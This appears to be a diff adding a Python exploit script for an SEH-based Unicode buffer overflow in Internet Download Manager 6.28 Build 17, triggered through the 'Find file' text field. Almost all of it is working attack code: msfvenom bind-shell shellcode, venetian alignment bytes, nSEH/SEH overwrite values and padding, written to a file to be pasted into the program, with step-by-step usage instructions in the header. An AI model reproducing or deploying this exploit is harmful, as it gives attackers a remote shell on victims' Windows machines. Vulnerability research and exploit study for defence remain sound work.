@@ -1,0 +1,69 @@
+#!/usr/bin/python
+# Exploit Title: Internet Download Manager 6.28 Build 17 - 'Find file'
+SEH Buffer Overflow (Unicode)
+# Date: 14-06-2017
+# Exploit Author: f3ci
+# Tested on: Windows 7 SP1 x86
+# How to exploit: Open IDM -> Downloads -> Find -> paste exploit string
+into 'Find file' text field
+
+#msfvenom -p windows/shell_bind_tcp LHOST=4444 -e x86/unicode_mixed
+BufferRegister=EAX -a x86 --platform windows -f python
+#Payload size: 782 bytes
+buf = "PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA"
+buf += "jXAQADAZABARALAYAIAQAIAQAIAhAAAZ"
+buf += "1AIAIAJ11AIAIABABABQI1AIQIAIQI11"
+buf += "1AIAJQYAZBABABABABkMAGB9u4JB9lK8"
+buf += "4BYpIpM0QPTIwuP1y00dtKr0LpTK22Jl"
+buf += "4K1Bn4TKQbMXLOWGNjNFp1KODlml31al"
+buf += "zbnLKpI16olMiqfggrhrobNwrkb2N0tK"
+buf += "pJmlRk0Lzq2XJCpHkQxQoaRk29o0m1wc"
+buf += "dKa9jxzCmjq9dKoDdKm1fvMakOfLfavo"
+buf += "jmIqHGOHGp2UzVlCqmjXoKQmKtbUhd28"
+buf += "Bk28LdIq7cOvbkJlPKtK0XML9qvsDKlD"
+buf += "BkjaHPayq4LdmTQK1KQQR9aJoa9oGpoo"
+buf += "OoOjRkZrjKbmOmBHMcp2IpM0RH1g2SNR"
+buf += "OopTqXnlQglfzgkOyEtxdPKQIpIpmYy4"
+buf += "Ntb0Phlie0rKM09oXU2J9x0Yr0Xb9mq0"
+buf += "r0a0npC87zZoyO9PKOj5bwBHJbkPkaQL"
+buf += "e97vrJZp0VQGRHy2GknWBGYohUR7phUg"
+buf += "Gy08IoyovuogqXsDXlmk8aIoXUR7dWph"
+buf += "t5bNpMaQioVuQXrCbM34ypu9Gs1Gogb7"
+buf += "01xvrJjr29qF8bim365wPDldoLzajaTM"
+buf += "q4ldjpuvypMtR4np26of26Mv0VnnaFaF"
+buf += "OcpVPhD9HLOO1vio6u2iwpNnr6pFKO00"
+buf += "Ph9xBgMMOpyofuWKHpVUcrr6qXeVruUm"
+buf += "3mkO9EOLlFcLJjcPyk9PRUyugK0GN3RR"
+buf += "0o2Jip23yoj5AA"
+ 
+#venetian
+venetian = "\x53"           #push ebx
+venetian += "\x42"          #align
+venetian += "\x58"          #pop eax
+venetian += "\x42"          #align
+venetian += "\x05\x02\x01"  #add eax,01000200
+venetian += "\x42"          #align
+venetian += "\x2d\x01\x01"  #add eax,01000100
+venetian += "\x42"          #align
+venetian += "\x50"          #push esp
+venetian += "\x42"          #align
+venetian += "\xC3"          #ret
+
+nseh = "\x61\x47" # popad
+seh =  "\x46\x5f" # 0x005f0046 IDMan.exe
+
+buffer = "\x41" * 2192      #junk
+buffer += nseh + seh        #nseh + seh
+buffer += venetian          #venetian
+buffer += "\x42" * 109      #junk
+buffer += buf               #shellcode
+buffer += "HeyCanYouFind"   #junk
+buffer += "ThisFileHuh?"    #junk
+
+ 
+filename = "C:\\Users\Lab\Desktop\idm.txt"
+file = open(filename, 'w')
+file.write(buffer)
+file.close()
+print buffer
+print "[+] File created successfully"
